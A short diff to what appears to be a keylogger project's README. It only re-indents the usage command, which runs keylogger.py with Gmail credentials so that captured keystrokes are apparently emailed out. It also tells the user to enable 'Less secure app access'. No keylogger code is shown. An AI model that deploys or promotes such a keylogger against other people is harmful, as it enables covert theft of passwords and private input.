@@ -36,7 +36,7 @@ pip install pynput
    
 2. Run the keylogger:
     ```bash
-  python keylogger.py -e <your-email@gmail.com> -p <your-email-password>
+    python keylogger.py -e <your-email@gmail.com> -p <your-email-password>
     ```
 Replace `your-email@gmail.com` and `your-email-password` with your Gmail credentials. Ensure you have "Less secure app access" enabled for the Gmail account.
 
